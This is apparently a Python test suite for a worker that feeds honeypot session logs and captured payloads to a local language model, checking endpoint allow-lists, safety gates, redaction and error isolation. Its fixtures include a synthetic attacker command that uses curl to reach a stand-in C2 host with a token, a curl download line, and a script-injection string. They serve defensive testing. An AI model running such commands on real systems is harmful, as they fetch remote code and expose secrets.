"""Worker orchestration tests; every fixture is synthetic and non-routable."""

from __future__ import annotations

import json
import os
import sys
import tempfile
import unittest
import unittest.mock
from pathlib import Path
from unittest.mock import MagicMock, patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import worker  # noqa: E402
from contracts import SessionAnalysis  # noqa: E402


def config(**changes):
    values = dict(
        enabled=False,
        dry_run=True,
        allow_captured_data=False,
        session_enabled=False,
        payload_enabled=False,
        daily_report_enabled=False,
        es_host="http://elasticsearch:9200",
        ollama_url="http://ollama:11434",
        model="qwen3.5:4b",
        expected_model_digest="a" * 64,
        embedding_enabled=False,
        embedding_model="nomic-embed-text",
        embedding_expected_digest="b" * 64,
        poll_interval=60,
        max_content_chars=12000,
        max_payload_bytes=1 << 20,
        max_events_per_cycle=2000,
        max_jobs_per_cycle=20,
        max_payload_scan_files=5000,
        session_idle_seconds=300,
        session_lookback_seconds=3600,
        daily_report_hour=6,
        context_length=8192,
        output_tokens=512,
        keep_alive="10m",
        payload_roots=(),
        log_level="INFO",
    )
    values.update(changes)
    return worker.Config(**values)


class EndpointAndGateTests(unittest.TestCase):
    def test_only_local_uncredentialed_endpoints_are_allowed(self):
        credential_url = "http://user" + ":" + "secret" + "@ollama:11434"
        allowed = {
            "http://ollama:11434",
            "http://127.0.0.1:11434",
            "http://10.8.0.2:11434",
            "http://172.20.0.2:9200",
            "http://[fd00::1]:11434",
        }
        rejected = {
            "https://api.openai.com/v1",
            "http://203.0.113.8:11434",
            "http://ollama:11434/api/chat",
            credential_url,
            "http://ollama:11434?next=https://example.com",
            "http://attacker.internal:11434",
        }
        for url in allowed:
            self.assertTrue(worker.endpoint_is_local(url, {"ollama", "elasticsearch"}), url)
        for url in rejected:
            self.assertFalse(worker.endpoint_is_local(url, {"ollama", "elasticsearch"}), url)

    def test_dry_run_is_the_default_and_needs_no_endpoint(self):
        with patch.dict(os.environ, {}, clear=True):
            parsed = worker.Config.from_env()
        self.assertTrue(parsed.dry_run)
        self.assertFalse(parsed.enabled)
        self.assertFalse(parsed.allow_captured_data)

    def test_captured_mode_requires_all_gates(self):
        with patch.dict(
            os.environ,
            {
                "LLM_DRY_RUN": "false",
                "LLM_ENABLED": "true",
                "LLM_SESSION_ENABLED": "true",
            },
            clear=True,
        ):
            with self.assertRaisesRegex(ValueError, "LLM_ALLOW_CAPTURED_DATA"):
                worker.Config.from_env()

    def test_external_model_endpoint_is_refused(self):
        with patch.dict(
            os.environ,
            {
                "LLM_DRY_RUN": "false",
                "LLM_ENABLED": "true",
                "LLM_ALLOW_CAPTURED_DATA": "true",
                "LLM_SESSION_ENABLED": "true",
                "OLLAMA_URL": "https://api.openai.com/v1",
            },
            clear=True,
        ):
            with self.assertRaisesRegex(ValueError, "OLLAMA_URL"):
                worker.Config.from_env()

    def test_synthetic_canary_requires_safe_gates(self):
        config(enabled=True).validate_synthetic_canary()
        for parsed in (
            config(enabled=False),
            config(enabled=True, dry_run=False, allow_captured_data=True, session_enabled=True),
            config(enabled=True, allow_captured_data=True),
            config(enabled=True, session_enabled=True),
        ):
            with self.assertRaises(ValueError):
                parsed.validate_synthetic_canary()

    def test_production_session_canary_is_u1_only_and_single_job(self):
        config(
            enabled=True,
            dry_run=False,
            allow_captured_data=True,
            session_enabled=True,
            max_jobs_per_cycle=1,
        ).validate_production_session_canary()
        for parsed in (
            config(enabled=True),
            config(enabled=True, dry_run=False, allow_captured_data=True, session_enabled=True),
            config(
                enabled=True,
                dry_run=False,
                allow_captured_data=True,
                session_enabled=True,
                payload_enabled=True,
                max_jobs_per_cycle=1,
            ),
        ):
            with self.assertRaises(ValueError):
                parsed.validate_production_session_canary()

    def test_keep_alive_is_bounded(self):
        self.assertEqual(worker.keep_alive_seconds("30s"), 30)
        self.assertEqual(worker.keep_alive_seconds("10m"), 600)
        for value in ("-1", "forever", "25h", "1d"):
            with self.assertRaises(ValueError):
                worker.keep_alive_seconds(value)


class SessionAccumulatorTests(unittest.TestCase):
    def event(self, event_id="cowrie.command.input", command="id"):
        return {
            "_index": "honeypot-v2-fixture",
            "_id": "event-1",
            "_source": {
                "@timestamp": "2026-08-01T12:00:00Z",
                "honeypot": {
                    "eventid": event_id,
                    "session": "session-fixture",
                    "src_ip": "203.0.113.9",
                    "input": command,
                },
                "source": {"ip": "203.0.113.9"},
                "process": {"command_line": command},
            },
        }

    def test_duplicate_event_is_idempotent_and_command_is_redacted(self):
        accumulator = worker.SessionAccumulator("session-fixture")
        event = self.event(command="TOKEN=fixture-secret curl http://c2.example.test/x")
        accumulator.add_event(event, 12000)
        accumulator.add_event(event, 12000)
        self.assertEqual(accumulator.command_count, 1)
        self.assertEqual(len(accumulator.event_hashes), 1)
        self.assertNotIn("fixture-secret", accumulator.commands[0])

    def test_close_and_login_state_are_recorded(self):
        accumulator = worker.SessionAccumulator("session-fixture")
        login = self.event(event_id="cowrie.login.success")
        login["_id"] = "login"
        closed = self.event(event_id="cowrie.session.closed")
        closed["_id"] = "closed"
        closed["_source"]["honeypot"]["duration"] = 42.5
        accumulator.add_event(login, 12000)
        accumulator.add_event(closed, 12000)
        self.assertTrue(accumulator.auth_success)
        self.assertTrue(accumulator.closed)
        self.assertEqual(accumulator.duration_seconds, 42.5)

    def test_collection_uses_stable_cowrie_event_ids_not_container_sensor(self):
        fake_es = MagicMock()
        fake_es.search.return_value = {"hits": {"hits": []}}
        parsed = config(session_lookback_seconds=86400)
        llm_worker = worker.LLMWorker(parsed, es=fake_es)
        with patch.object(llm_worker, "load_checkpoint", return_value="2026-08-01T00:00:00Z"):
            self.assertEqual(llm_worker.collect_session_events(), 0)
        body = fake_es.search.call_args.kwargs["body"]
        filters = body["query"]["bool"]["filter"]
        self.assertIn({"terms": {"honeypot.eventid": list(worker.COWRIE_SESSION_EVENT_IDS)}}, filters)
        self.assertFalse(any("event.sensor" in str(item) for item in filters))
        self.assertEqual(body["sort"], [{"@timestamp": {"order": "asc"}}])

    def test_close_only_scanner_session_does_not_create_accumulator_state(self):
        fake_es = MagicMock()
        fake_es.search.return_value = {
            "hits": {
                "hits": [
                    {
                        "_index": "honeypot-v2-fixture",
                        "_id": "closed-only",
                        "_source": {
                            "@timestamp": "2026-08-01T12:00:00Z",
                            "honeypot": {
                                "eventid": "cowrie.session.closed",
                                "session": "scanner-only-fixture",
                            },
                        },
                    }
                ]
            }
        }
        llm_worker = worker.LLMWorker(config(), es=fake_es)
        with (
            patch.object(llm_worker, "load_checkpoint", return_value="2026-08-01T00:00:00Z"),
            patch.object(llm_worker, "load_accumulator", return_value=worker.SessionAccumulator("scanner-only-fixture")),
            patch.object(llm_worker, "save_checkpoint") as save_checkpoint,
        ):
            self.assertEqual(llm_worker.collect_session_events(), 1)
        fake_es.index.assert_not_called()
        save_checkpoint.assert_called_once_with("sessions", "2026-08-01T12:00:00Z")


class ProductionCanaryTests(unittest.TestCase):
    def test_canary_scans_bounded_cycles_and_stops_after_one_session(self):
        parsed = config(
            enabled=True,
            dry_run=False,
            allow_captured_data=True,
            session_enabled=True,
            max_jobs_per_cycle=1,
        )
        fake_worker = MagicMock()
        fake_worker.run_once.side_effect = [
            {"events": 2000, "sessions": 0},
            {"events": 600, "sessions": 1},
        ]
        with patch.object(worker, "LLMWorker", return_value=fake_worker):
            result = worker.run_production_session_canary(parsed, 20)
        self.assertEqual(result["cycles"], 2)
        self.assertEqual(result["events"], 2600)
        self.assertEqual(result["sessions"], 1)
        self.assertEqual(result["payloads"], 0)
        self.assertEqual(result["reports"], 0)


class CycleStageIsolationTests(unittest.TestCase):
    """#1748: one failing stage must not discard the others' work.

    Before this, a stage raising aborted run_once() entirely -- the sessions
    and payloads already analysed were lost from the status document, which
    reported only the exception type. That made a broken daily report
    indistinguishable from a broken worker, and disabling the report was the
    only way to get the other two pipelines running again.
    """

    def _worker(self):
        w = worker.LLMWorker.__new__(worker.LLMWorker)
        w.es = unittest.mock.Mock()
        w.es.ping.return_value = True
        w.model = unittest.mock.Mock()
        w.config = unittest.mock.Mock(
            dry_run=False, session_enabled=True, payload_enabled=True, daily_report_enabled=True
        )
        w.ensure_indices = lambda: None
        w.collect_session_events = lambda: 7
        w.analyze_ready_sessions = lambda: 3
        w.analyze_payloads = lambda: 2
        return w

    def test_a_failing_stage_keeps_the_others_results(self):
        w = self._worker()

        def boom():
            raise RuntimeError("grammar rejected")

        w.analyze_daily_report = boom
        result = w.run_once()
        self.assertEqual(result["sessions"], 3, "session work must survive the report failing")
        self.assertEqual(result["payloads"], 2, "payload work must survive it too")
        self.assertEqual(result["reports"], 0)
        self.assertEqual(result["stage_errors"], {"daily_report": "RuntimeError"})

    def test_a_healthy_cycle_reports_no_stage_errors(self):
        w = self._worker()
        w.analyze_daily_report = lambda: 1
        result = w.run_once()
        self.assertNotIn("stage_errors", result)
        self.assertEqual(result["reports"], 1)

    def test_only_the_exception_type_is_recorded_never_its_message(self):
        # These exceptions come from a model fed attacker-controlled text; a
        # message can carry that text back out into the status file.
        w = self._worker()

        def boom():
            raise ValueError("payload said: <script>alert(1)</script>")

        w.analyze_daily_report = boom
        errors = w.run_once()["stage_errors"]
        self.assertEqual(errors, {"daily_report": "ValueError"})
        self.assertNotIn("script", json.dumps(errors))

    def test_every_stage_is_isolated_not_just_the_report(self):
        w = self._worker()

        def boom():
            raise RuntimeError("es unavailable")

        w.analyze_payloads = boom
        w.analyze_daily_report = lambda: 1
        result = w.run_once()
        self.assertEqual(result["payloads"], 0)
        self.assertEqual(result["reports"], 1, "the report still runs after payloads fail")
        self.assertEqual(result["stage_errors"], {"payloads": "RuntimeError"})


class GPUQueueVendoringTests(unittest.TestCase):
    def test_vendored_copy_matches_canonical(self):
        # gpu_queue.py is vendored (not imported across containers) into
        # every consumer -- see its own module docstring for why. A
        # vendored copy that drifts from the canonical one is exactly the
        # kind of thing that's easy to miss in review; catch it in CI
        # instead, same pattern as ghidra-worker.py's TRIAGE_SYSTEM
        # contract test.
        root = Path(__file__).resolve().parents[2]
        canonical = (root / "analysis/gpu-queue/gpu_queue.py").read_text()
        vendored = (root / "llm-worker/gpu_queue.py").read_text()
        self.assertEqual(canonical, vendored)


class OllamaContractTests(unittest.TestCase):
    def test_default_model_matches_approved_session_slot(self):
        manifest = json.loads(
            (Path(__file__).resolve().parents[2] / "analysis/ghidra/models/approved-models.json").read_text()
        )
        with patch.dict(os.environ, {}, clear=True):
            parsed = worker.Config.from_env()
        self.assertEqual(parsed.model, manifest["slots"]["sessions"]["artifact"]["tag"])

    def test_model_digest_must_match_the_approved_pin(self):
        fake_response = MagicMock()
        fake_response.is_redirect = False
        fake_response.is_permanent_redirect = False
        fake_response.raise_for_status.return_value = None
        fake_response.json.return_value = {
            "models": [{"name": "qwen3.5:4b", "digest": "b" * 64}]
        }
        fake_session = MagicMock()
        fake_session.get.return_value = fake_response
        with patch.object(worker.requests, "Session", return_value=fake_session):
            client = worker.OllamaClient(config())
            with self.assertRaisesRegex(worker.ModelRequestError, "does not match"):
                client.model_digest()

    def test_native_request_disables_thinking_and_uses_schema(self):
        fake_response = MagicMock()
        fake_response.is_redirect = False
        fake_response.is_permanent_redirect = False
        fake_response.raise_for_status.return_value = None
        fake_response.json.return_value = {
            "message": {
                "content": json.dumps(
                    {
                        "summary": "Reconnaissance commands were observed.",
                        "intent": "reconnaissance",
                        "mitre_attack": ["T1087"],
                        "iocs": [],
                        "severity": "medium",
                        "confidence": "high",
                    }
                )
            },
            "prompt_eval_count": 100,
            "eval_count": 30,
            "done_reason": "stop",
        }
        fake_session = MagicMock()
        fake_session.post.return_value = fake_response
        with patch.object(worker.requests, "Session", return_value=fake_session):
            client = worker.OllamaClient(config())
            annotation, telemetry = client.analyze("fixture prompt", SessionAnalysis)
        request = fake_session.post.call_args.kwargs
        manifest = json.loads(
            (Path(__file__).resolve().parents[2] / "analysis/ghidra/models/approved-models.json").read_text()
        )
        approved = manifest["slots"]["sessions"]["runtime_request"]
        self.assertFalse(request["allow_redirects"])
        self.assertEqual(request["json"]["think"], approved["thinking"])
        self.assertEqual(request["json"]["keep_alive"], approved["keep_alive"])
        self.assertEqual(request["json"]["options"]["num_ctx"], approved["context_tokens"])
        self.assertEqual(request["json"]["options"]["num_predict"], approved["output_tokens"])
        self.assertEqual(request["json"]["options"]["temperature"], approved["temperature"])
        self.assertEqual(request["json"]["options"]["seed"], approved["seed"])
        self.assertEqual(request["json"]["format"]["additionalProperties"], False)
        mitre_items = request["json"]["format"]["properties"]["mitre_attack"]["items"]
        self.assertEqual(mitre_items["pattern"], r"^T[0-9]{4}(?:\.[0-9]{3})?$")
        self.assertEqual(annotation.intent, "reconnaissance")
        self.assertEqual(telemetry["prompt_tokens"], 100)
        self.assertFalse(fake_session.trust_env)

    def test_embed_returns_the_configured_dimensionality(self):
        fake_response = MagicMock()
        fake_response.is_redirect = False
        fake_response.is_permanent_redirect = False
        fake_response.raise_for_status.return_value = None
        fake_response.json.return_value = {"embeddings": [[0.1] * worker.EMBEDDING_DIMS]}
        fake_session = MagicMock()
        fake_session.post.return_value = fake_response
        with patch.object(worker.requests, "Session", return_value=fake_session):
            client = worker.OllamaClient(config())
            vector = client.embed("session summary text")
        self.assertEqual(len(vector), worker.EMBEDDING_DIMS)
        self.assertTrue(all(isinstance(value, float) for value in vector))
        request = fake_session.post.call_args
        self.assertEqual(request.args[0], "http://ollama:11434/api/embed")
        self.assertEqual(request.kwargs["json"]["model"], "nomic-embed-text")
        self.assertEqual(request.kwargs["json"]["input"], "session summary text")
        self.assertFalse(request.kwargs["allow_redirects"])

    def test_embed_rejects_a_response_with_the_wrong_dimensionality(self):
        # #151: nomic-embed-text's real native output is 768-dim (confirmed
        # live, contradicting docs/gpu-llm-analysis-worker.md's stale
        # "384-dimensional" text) -- a response shaped for a different
        # embedding model must be rejected outright, not silently indexed
        # as if it matched EMBEDDING_DIMS, which would corrupt every future
        # kNN query against this index.
        fake_response = MagicMock()
        fake_response.is_redirect = False
        fake_response.is_permanent_redirect = False
        fake_response.raise_for_status.return_value = None
        fake_response.json.return_value = {"embeddings": [[0.1] * 384]}
        fake_session = MagicMock()
        fake_session.post.return_value = fake_response
        with patch.object(worker.requests, "Session", return_value=fake_session):
            client = worker.OllamaClient(config())
            with self.assertRaisesRegex(worker.ModelResponseError, "768-dimensional"):
                client.embed("session summary text")

    def test_embedding_digest_must_match_the_configured_pin(self):
        fake_response = MagicMock()
        fake_response.is_redirect = False
        fake_response.is_permanent_redirect = False
        fake_response.raise_for_status.return_value = None
        fake_response.json.return_value = {
            "models": [{"name": "nomic-embed-text", "digest": "c" * 64}]
        }
        fake_session = MagicMock()
        fake_session.get.return_value = fake_response
        with patch.object(worker.requests, "Session", return_value=fake_session):
            client = worker.OllamaClient(config())
            with self.assertRaisesRegex(worker.ModelRequestError, "does not match"):
                client.embedding_digest()

    def test_embedding_enabled_outside_dry_run_requires_a_pinned_digest(self):
        with self.assertRaisesRegex(ValueError, "LLM_EMBEDDING_EXPECTED_DIGEST"):
            config(
                dry_run=False,
                enabled=True,
                allow_captured_data=True,
                session_enabled=True,
                embedding_enabled=True,
                embedding_expected_digest="",
            ).validate_mode()

    def test_session_analysis_attaches_an_embedding_when_enabled(self):
        analysis = SessionAnalysis(
            summary="Reconnaissance commands were observed.",
            intent="reconnaissance",
            mitre_attack=["T1087"],
            iocs=[],
            severity="medium",
            confidence="high",
        )
        fake_client = MagicMock()
        fake_client.model_digest.return_value = "a" * 64
        fake_client.analyze.return_value = (analysis, {"prompt_tokens": 10, "output_tokens": 5})
        fake_client.embed.return_value = [0.2] * worker.EMBEDDING_DIMS
        fake_client.embedding_digest.return_value = "c" * 64
        fake_es = MagicMock()
        llm_worker = worker.LLMWorker(config(embedding_enabled=True), es=fake_es, model=fake_client)
        accumulator = worker.SessionAccumulator(
            session_id="sess-1", source_index="honeypot-v2-cowrie",
        )
        accumulator.commands = ["whoami"]
        accumulator.command_count = 1
        with patch.object(worker.LLMWorker, "ready_sessions", return_value=[("state-1", accumulator)]):
            completed = llm_worker.analyze_ready_sessions()
        self.assertEqual(completed, 1)
        indexed = fake_es.index.call_args_list[0].kwargs["document"]
        self.assertEqual(indexed["embedding"], [0.2] * worker.EMBEDDING_DIMS)
        self.assertEqual(indexed["embedding_model"], "nomic-embed-text")
        self.assertEqual(indexed["embedding_model_digest"], "c" * 64)

    def test_session_analysis_degrades_without_an_embedding_on_failure(self):
        analysis = SessionAnalysis(
            summary="Reconnaissance commands were observed.",
            intent="reconnaissance",
            mitre_attack=["T1087"],
            iocs=[],
            severity="medium",
            confidence="high",
        )
        fake_client = MagicMock()
        fake_client.model_digest.return_value = "a" * 64
        fake_client.analyze.return_value = (analysis, {"prompt_tokens": 10, "output_tokens": 5})
        fake_client.embed.side_effect = worker.ModelRequestError("embedding endpoint unreachable")
        fake_es = MagicMock()
        llm_worker = worker.LLMWorker(config(embedding_enabled=True), es=fake_es, model=fake_client)
        accumulator = worker.SessionAccumulator(
            session_id="sess-2", source_index="honeypot-v2-cowrie",
        )
        accumulator.commands = ["whoami"]
        accumulator.command_count = 1
        with patch.object(worker.LLMWorker, "ready_sessions", return_value=[("state-2", accumulator)]):
            completed = llm_worker.analyze_ready_sessions()
        self.assertEqual(completed, 1, "an embedding failure must not fail the surrounding session analysis")
        indexed = fake_es.index.call_args_list[0].kwargs["document"]
        self.assertNotIn("embedding", indexed)

    def test_synthetic_canary_uses_only_synthetic_cases_and_checks_unload(self):
        responses = [
            SessionAnalysis(
                summary="System reconnaissance commands were observed.",
                intent="reconnaissance",
                mitre_attack=["T1087"],
                iocs=[],
                severity="medium",
                confidence="high",
            ),
            SessionAnalysis(
                summary="Credential material was encoded and transferred.",
                intent="data-theft",
                mitre_attack=["T1552", "T1041"],
                iocs=[],
                severity="high",
                confidence="high",
            ),
        ]
        fake_client = MagicMock()
        fake_client.model_digest.return_value = "a" * 64
        fake_client.analyze.side_effect = [(item, {"prompt_tokens": 100, "output_tokens": 30}) for item in responses]
        fake_client.wait_until_unloaded.return_value = 32000
        with patch.object(worker, "OllamaClient", return_value=fake_client):
            result = worker.run_synthetic_model_canary(config(enabled=True), idle_timeout=90)
        self.assertEqual(result["mode"], "synthetic-model-canary")
        self.assertEqual(result["idle_unload_ms"], 32000)
        self.assertEqual(result["cases"][1]["severity"], "critical")
        self.assertIn("prompt_injection_text", result["cases"][1]["deterministic_flags"])
        prompts = [call.args[0] for call in fake_client.analyze.call_args_list]
        self.assertTrue(all("<untrusted_data>" in prompt for prompt in prompts))
        self.assertTrue(all("fixture-secret" not in prompt for prompt in prompts))


class PayloadSafetyTests(unittest.TestCase):
    def test_scanner_only_returns_regular_bounded_text(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            text_path = root / ("a" * 64)
            text_path.write_text("curl http://198.51.100.2/fixture\n", encoding="utf-8")
            (root / ("b" * 64)).write_bytes(b"MZ\x00binary")
            outside = root.parent / "outside-fixture"
            outside.write_text("not allowed", encoding="utf-8")
            link = root / ("c" * 64)
            try:
                link.symlink_to(outside)
            except OSError:
                link = None
            parsed = config(payload_roots=(root,), max_payload_bytes=1024)
            found = worker.LLMWorker(parsed).iter_text_payloads()
            self.assertEqual(len(found), 1)
            self.assertEqual(found[0][1], text_path.read_bytes())
            if link is not None:
                self.assertNotEqual(found[0][0], worker.hashlib.sha256(outside.read_bytes()).hexdigest())
            outside.unlink()


class OfflineSelftestTests(unittest.TestCase):
    def test_selftest_and_dry_cycle_use_no_clients(self):
        worker.run_selftest()
        result = worker.LLMWorker(config()).run_once()
        self.assertEqual(result["mode"], "dry-run")
        self.assertTrue(result["selftest"])


if __name__ == "__main__":
    unittest.main()
